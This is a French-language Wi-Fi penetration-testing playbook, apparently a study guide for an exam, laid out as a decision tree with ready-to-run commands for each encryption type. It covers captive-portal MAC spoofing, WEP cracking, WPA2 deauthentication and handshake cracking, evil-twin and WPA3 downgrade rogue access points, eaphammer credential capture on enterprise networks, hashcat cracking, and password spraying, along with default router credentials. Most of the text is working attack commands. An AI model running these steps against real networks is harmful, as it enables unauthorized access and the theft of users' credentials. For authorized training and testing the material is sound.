# Accès Initial Wi-Fi

## Placeholders utilisés dans cette section

Toutes les commandes ci-dessous sont génériques. Remplace les placeholders avec les valeurs
récupérées en reconnaissance (voir [Reconnaissance > Scan passif](02-reconnaissance.md)).

| Placeholder | Valeur à substituer | Comment l'obtenir |
|---|---|---|
| `<IFACE_MON>` | Interface en mode moniteur | Résultat de `airmon-ng start <IFACE>` (ex: wlan0mon) |
| `<IFACE>` | Interface managed pour connexions | Lister avec `airmon-ng` ou `iwconfig` (ex: wlan1, wlan2) |
| `<BSSID>` | Adresse MAC de l'AP cible | Colonne BSSID dans airodump-ng |
| `<CH>` | Canal de l'AP cible | Colonne CH dans airodump-ng |
| `<SSID>` | Nom exact du réseau | Colonne ESSID dans airodump-ng |
| `<MAC_CLIENT>` | MAC d'un client connecté à l'AP | Colonne STATION dans airodump-ng (tableau du bas) |
| `<WORDLIST>` | Chemin vers le dictionnaire | Ex: `~/rockyou-top100000.txt` ou `~/rockyou.txt` |
| `<CAPTURE>` | Préfixe des fichiers de capture | Ex: `~/wifi/capture` → génère `capture-01.cap` |
| `<FREQ>` | Fréquence du canal en MHz | Voir tableau : 2412=CH1, 2437=CH6, 2462=CH11 |

!!! tip "Trouver les interfaces disponibles"
    Avant tout : `sudo airmon-ng` liste toutes les interfaces Wi-Fi et leurs pilotes.
    L'interface monitor (`<IFACE_MON>`) et les interfaces managed (`<IFACE>`) sont distinctes.
    En mode moniteur, utilise une interface managed séparée pour te connecter.

---

## Arbre de décision

```
Quel chiffrement annonce l'AP ? (colonne ENC dans airodump-ng)
    │
    ├── OPN (pas de chiffrement)
    │       → Connexion directe (3.1)
    │       → Si portail captif : MAC spoofing (3.2)
    │
    ├── WEP
    │       → besside-ng automatique (3.3)
    │       → airodump-ng + aireplay-ng + aircrack-ng (3.4)
    │
    ├── WPA2 / PSK
    │       → Capture handshake + crack dictionnaire (3.5)
    │       → Si SSID caché ou client mémorisé : Evil Twin (3.6)
    │
    ├── WPA3 / SAE
    │       → Brute force en ligne avec wacker (3.7)
    │       → Si WPA2+WPA3 mixte : downgrade WPA2 (3.8)
    │
    └── WPA2 ou WPA3 / MGT (Enterprise / 802.1X)
            → Fuite identité EAP passive (3.9)
            → Certificat TLS du serveur (3.10)
            → Identifier méthode EAP (3.11)
            → Rogue AP + MSCHAPv2 avec eaphammer (3.12)
            → Brute force avec air-hammer (3.13)
            → Password spraying avec air-hammer (3.14)
```

---

## 3.1 Réseau ouvert (OPN) : connexion directe

Un réseau ouvert ne chiffre pas le trafic. `wpa_supplicant` gère l'association Wi-Fi
même sans mot de passe. `scan_ssid=1` force un scan actif, utile si le SSID est caché.

```bash
# Créer le fichier de configuration
cat > ~/wifi/open.conf << EOF
network={
    ssid="<SSID>"
    key_mgmt=NONE
    scan_ssid=1
}
EOF

# Associer à l'AP (<IFACE> = interface managed, pas l'interface monitor)
sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/open.conf

# Dans un autre terminal : demander une IP via DHCP
sudo dhclient <IFACE> -v
```

Une fois l'IP obtenue, tester les identifiants par défaut sur le panneau d'admin du routeur
(admin:admin, admin:password, admin:1234, root:root).

---

## 3.2 Réseau ouvert avec portail captif : MAC spoofing

Certains portails captifs autorisent les clients uniquement par **adresse MAC**.
En usurpant la MAC d'un client déjà autorisé, on contourne la restriction.

La MAC autorisée à usurper se trouve :

- dans `airodump-ng` : clients dans le tableau du bas qui échangent du trafic
- via `arp-scan -I <IFACE> -l` une fois connecté sur le réseau

```bash
# Arrêter NetworkManager pour éviter les conflits
sudo systemctl stop NetworkManager

# Désactiver l'interface (obligatoire pour modifier la MAC)
sudo ip link set <IFACE> down

# Appliquer la MAC d'un client autorisé
sudo macchanger -m <MAC_CIBLE> <IFACE>

# Réactiver
sudo ip link set <IFACE> up

# Se reconnecter
sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/open.conf &
sudo dhclient <IFACE> -v
```

---

## 3.3 WEP : crack automatique avec besside-ng

`besside-ng` fait la capture et le crack WEP en une seule commande. Il sniffe le trafic,
génère des paquets pour accélérer la collecte d'IVs et craque la clé automatiquement.

`<BSSID>` et `<CH>` : obtenus depuis airodump-ng (voir [Reconnaissance](02-reconnaissance.md)).

```bash
# Interface managed (pas l'interface monitor)
sudo besside-ng -c <CH> -b <BSSID> <IFACE> -v
```

La clé WEP s'affiche en hexadécimal dans la sortie dès qu'elle est trouvée.

!!! warning "Interface managed"
    `besside-ng` utilise une interface en mode **managed**, pas l'interface monitor.

---

## 3.4 WEP : attaque manuelle (airodump + aireplay + aircrack)

Si `besside-ng` n'est pas disponible. L'objectif est d'accumuler ~50 000 IVs uniques
dans la colonne `#Data` d'airodump-ng.

`<MAC_SRC>` pour aireplay : n'importe quelle MAC valide (la tienne ou une inventée).

```bash
# Terminal 1 : capturer le trafic WEP
sudo airodump-ng --bssid <BSSID> -c <CH> -w <CAPTURE> <IFACE_MON>

# Terminal 2 : fausse authentification pour que l'AP accepte nos paquets injectés
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> <IFACE_MON>

# Terminal 2 (suite) : injection ARP pour forcer l'AP à renvoyer des IVs
sudo aireplay-ng --arpreplay -b <BSSID> -h <MAC_SRC> <IFACE_MON>
```

Quand `#Data` dépasse ~50 000 dans airodump-ng :

```bash
# Casser la clé (le fichier est nommé <CAPTURE>-01.cap)
sudo aircrack-ng <CAPTURE>-01.cap
```

```bash
# Se connecter avec la clé trouvée (enlever les ':' de la clé hexadécimale)
cat > ~/wifi/wep.conf << EOF
network={
    ssid="<SSID>"
    key_mgmt=NONE
    wep_key0=<CLÉ_HEX_SANS_DEUX_POINTS>
    wep_tx_keyidx=0
}
EOF

sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/wep.conf
sudo dhclient <IFACE> -v
```

---

## 3.5 WPA2-PSK : capture handshake + crack

### Principe

Le 4-way handshake contient un hash du mot de passe PSK. Le capturer permet de casser
le mot de passe hors ligne par dictionnaire, sans interagir à nouveau avec l'AP.

`<BSSID>` et `<CH>` : depuis airodump-ng. La capture doit inclure le handshake complet
(message `WPA handshake: <BSSID>` en haut à droite d'airodump-ng).

```bash
# Terminal 1 : capturer le trafic de l'AP cible
sudo airodump-ng --bssid <BSSID> -c <CH> -w <CAPTURE> <IFACE_MON>
```

Si aucun client ne se connecte naturellement, forcer la reconnexion :

```bash
# Terminal 2 : déauthentifier tous les clients de l'AP
# -0 : mode deauth, 10 : nombre de paquets (0 = continu)
sudo aireplay-ng -0 10 -a <BSSID> <IFACE_MON>

# Pour cibler un client précis plutôt que tous :
sudo aireplay-ng -0 10 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
```

```bash
# Casser le mot de passe avec un dictionnaire
aircrack-ng <CAPTURE>-01.cap -w <WORDLIST>
```

```bash
# Se connecter avec le mot de passe trouvé
cat > ~/wifi/psk.conf << EOF
network={
    ssid="<SSID>"
    psk="<PASSWORD>"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
EOF

sudo wpa_supplicant -Dnl80211 -i <IFACE> -c ~/wifi/psk.conf
sudo dhclient <IFACE> -v
```

---

## 3.6 WPA2-PSK : Evil Twin (réseau caché ou client mémorisé)

Si l'AP n'est plus en ligne mais que des clients envoient des Probe Requests pour ce SSID
(visible dans la colonne `Probed ESSIDs` d'airodump-ng), un Rogue AP avec le même SSID
force le client à se connecter et à soumettre un handshake.

`hostapd-mana` est une version modifiée de `hostapd` qui capture les handshakes WPA
des clients qui tentent de s'y authentifier.

```bash
cat > ~/wifi/hostapd-evil.conf << EOF
interface=<IFACE>
driver=nl80211
hw_mode=g
channel=<CH>
ssid=<SSID>
mana_wpaout=~/wifi/capture.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
EOF

sudo hostapd-mana ~/wifi/hostapd-evil.conf
```

!!! warning "wpa_passphrase est un leurre"
    Le mot de passe du Rogue AP est arbitraire. Le client envoie quand même un handshake
    avec son vrai mot de passe, que `hostapd-mana` capture dans le fichier `.hccapx`.

Dès qu'un client se connecte, arrêter avec CTRL+C.

```bash
# Extraire et convertir le hash au format hashcat 22000
grep -oP 'WPA\*\S+' ~/wifi/capture.hccapx > ~/wifi/clean.22000

# Casser
hashcat -a 0 -m 22000 ~/wifi/clean.22000 <WORDLIST> --force

# Afficher le résultat
hashcat -m 22000 ~/wifi/clean.22000 --show
```

La sortie contient : `hash:MAC_CLIENT:<SSID>:<PASSWORD>`

!!! tip "Accélérer avec une déauth"
    Si des clients sont déjà connectés à l'AP légitime, les déauthentifier d'abord :
    ```bash
    iwconfig <IFACE_MON> channel <CH>
    sudo aireplay-ng -0 0 -a <BSSID> <IFACE_MON>
    ```

---

## 3.7 WPA3-SAE : brute force en ligne avec wacker

WPA3 utilise SAE (Simultaneous Authentication of Equals). Il n'y a pas de handshake
crackable hors ligne : chaque tentative nécessite une vraie interaction avec l'AP.

`<FREQ>` correspond à la fréquence du canal en MHz :

| Canal | Fréquence |
|---|---|
| 1 | 2412 |
| 6 | 2437 |
| 11 | 2462 |
| 36 | 5180 |
| 40 | 5200 |
| 44 | 5220 |

Formule 2.4 GHz : `2407 + (CH * 5)`. Ou vérifier avec `iwlist <IFACE> channel`.

```bash
cd ~/tools/wacker/

./wacker.py \
    --wordlist <WORDLIST> \
    --ssid <SSID> \
    --bssid <BSSID> \
    --interface <IFACE> \
    --freq <FREQ>
```

Wacker teste chaque mot du dictionnaire via une vraie authentification SAE contre l'AP.
Quand elle réussit, le mot de passe est affiché.

---

## 3.8 WPA3+WPA2 mixte : downgrade attack

Quand l'AP supporte à la fois WPA3-SAE et WPA2-PSK (AUTH = `SAE+PSK` dans airodump-ng)
et que **802.11w (MFP) est désactivé**, on peut forcer un client WPA3 à se rabattre
sur WPA2 via un Rogue AP WPA2-only.

### Vérifier si MFP est actif

Ouvrir la capture dans Wireshark et filtrer sur les beacon frames de l'AP :

```text
(wlan.bssid == <BSSID>) && (wlan.fc.type_subtype == 8)
```

Dans le paquet, chercher `RSN Information > RSN Capabilities > Management Frame Protection`.
Si désactivé, l'attaque est possible.

```bash
# Créer le Rogue AP WPA2-only (même SSID, pas de SAE)
cat > ~/wifi/hostapd-downgrade.conf << EOF
interface=<IFACE>
driver=nl80211
hw_mode=g
channel=<CH>
ssid=<SSID>
mana_wpaout=~/wifi/downgrade.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
EOF

sudo hostapd-mana ~/wifi/hostapd-downgrade.conf &

# Déauthentifier le client du vrai AP pour le forcer à se reconnecter
iwconfig <IFACE_MON> channel <CH>
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
```

Le client se reconnecte en WPA2 sur le Rogue AP. Récupérer le handshake puis :

```bash
# Convertir le hccapx en format 22000
hcxhash2cap --hccapx=~/wifi/downgrade.hccapx -c ~/wifi/aux.pcap
hcxpcapngtool ~/wifi/aux.pcap -o ~/wifi/downgrade.22000

hashcat -a 0 -m 22000 ~/wifi/downgrade.22000 <WORDLIST> --force
```

---

## 3.9 WPA-Enterprise : fuite d'identité EAP passive

Dans WPA-Enterprise (AUTH = MGT), le client envoie son identité (`DOMAIN\user` ou
`user@domain`) dans un paquet EAP-Response/Identity **avant** que le tunnel TLS soit actif.
Si l'option `anonymous_identity` n'est pas configurée côté client, cette info fuit en clair.

```bash
# Capturer le trafic sur le canal de l'AP Enterprise
sudo airodump-ng <IFACE_MON> -w <CAPTURE> -c <CH>

# Analyser avec Wireshark
wireshark <CAPTURE>-01.cap
```

Filtre Wireshark pour isoler les paquets d'identité EAP :

```text
eap && eap.code == 2 && eap.identity
```

Le champ **Identity** contient `DOMAIN\username` ou `user@domain.com`.

---

## 3.10 WPA-Enterprise : extraction du certificat TLS serveur

Le serveur RADIUS envoie son certificat X.509 en clair lors de la négociation TLS.
Ce certificat peut révéler email interne, CN, organisation, domaine Active Directory.

Utilise la capture de la section 3.9 (même canal, même AP).

```bash
# Extraction via tshark : champs texte IA5String du certificat X.509
tshark -r <CAPTURE>-01.cap \
    -Y "wlan.bssid == <BSSID> && x509sat.IA5String" \
    -T fields -e x509sat.IA5String

# Ou dans Wireshark avec le filtre :
# (wlan.sa == <BSSID>) && (tls.handshake.certificate)
# Puis chercher le champ "Email Address" dans le certificat
```

---

## 3.11 WPA-Enterprise : identifier les méthodes EAP

Avant de monter un Rogue AP, savoir quelles méthodes EAP l'AP accepte permet de
configurer `eaphammer` correctement.

```bash
cd ~/tools/EAP_buster/

# L'identité peut être fictive : elle sert uniquement à déclencher la négociation
bash ./EAP_buster.sh <SSID> '<DOMAIN>\<USER_FICTIF>' <IFACE>
```

Si EAP_buster ne retourne rien, analyser la capture (section 3.9) dans Wireshark
avec le filtre `eap` pour identifier les méthodes négociées dans les paquets EAP-Request.

---

## 3.12 WPA-Enterprise : Rogue AP + MSCHAPv2 (eaphammer)

Si le client ne vérifie pas le certificat du serveur RADIUS, il se connecte à n'importe
quel AP qui présente un certificat valide. `eaphammer` crée ce Rogue AP et capture les
credentials MSCHAPv2, crackables hors ligne.

```bash
cd ~/tools/eaphammer

# Étape 1 : générer un certificat auto-signé pour le Rogue AP
# Renseigner les champs avec les infos du vrai certificat si disponibles (section 3.10)
python3 ./eaphammer --cert-wizard

# Étape 2 : lancer le Rogue AP
python3 ./eaphammer \
    -i <IFACE> \
    --auth wpa-eap \
    --essid <SSID> \
    --creds \
    --negotiate balanced
```

```bash
# Étape 3 : déauthentifier les clients du/des AP légitimes
# Si plusieurs AP pour le même SSID, chacun doit être attaqué
iwconfig <IFACE_MON> channel <CH>
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
```

```bash
# Étape 4 : extraire et casser les hashes MSCHAPv2 capturés
cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> ~/wifi/mschap.5500
hashcat -a 0 -m 5500 ~/wifi/mschap.5500 <WORDLIST> --force
```

---

## 3.13 WPA-Enterprise : brute force avec air-hammer

Si le domaine et un nom d'utilisateur valide sont connus (depuis section 3.9 ou 3.15),
tester un dictionnaire directement contre l'AP.

```bash
cd ~/tools/air-hammer

# Créer le fichier utilisateur au format DOMAIN\user
echo '<DOMAIN>\<USERNAME>' > ~/wifi/creds/target.user

./air-hammer.py \
    -i <IFACE> \
    -e <SSID> \
    -p <WORDLIST> \
    -u ~/wifi/creds/target.user
```

!!! warning "Dépendances"
    `air-hammer.py` peut nécessiter des ajustements selon la version Python. Vérifier les
    imports avant l'exam.

---

## 3.14 WPA-Enterprise : password spraying avec air-hammer

Un seul mot de passe testé sur une liste d'utilisateurs. Efficace en entreprise où les
politiques de mot de passe imposent des formats prévisibles.

```bash
# Construire la liste au format DOMAIN\user depuis une wordlist de noms communs
cat <WORDLIST_USERNAMES> | awk '{print "<DOMAIN>\\" $1}' > ~/wifi/creds/users-domain.txt

cd ~/tools/air-hammer

# -P (majuscule) = un seul mot de passe, -u = fichier de liste d'utilisateurs
./air-hammer.py \
    -i <IFACE> \
    -e <SSID> \
    -P <MOT_DE_PASSE_UNIQUE> \
    -u ~/wifi/creds/users-domain.txt
```

---

## Checklist Accès Initial

- [ ] Placeholders renseignés depuis la recon (BSSID, CH, SSID, clients)
- [ ] **OPN** : wpa_supplicant + dhclient → identifiants par défaut testés
- [ ] **OPN + portail captif** : MAC autorisée identifiée → macchanger → reconnexion
- [ ] **WEP** : besside-ng automatique ou airodump + aireplay + aircrack (manuel)
- [ ] **WPA2-PSK** : handshake capturé (mention dans airodump-ng) → aircrack-ng
- [ ] **WPA2-PSK SSID caché** : hostapd-mana (Evil Twin) → hashcat -m 22000
- [ ] **WPA3-SAE** : wacker (brute force en ligne)
- [ ] **WPA3+WPA2 mixte** : MFP vérifié → downgrade Rogue AP → hashcat -m 22000
- [ ] **Enterprise** : identité EAP lue → certificat extrait → méthode EAP identifiée
- [ ] **Enterprise MSCHAPv2** : eaphammer → hashcat -m 5500
- [ ] **Enterprise brute force** : air-hammer (un user, dictionnaire)
- [ ] **Enterprise spraying** : air-hammer (liste users, un mot de passe)
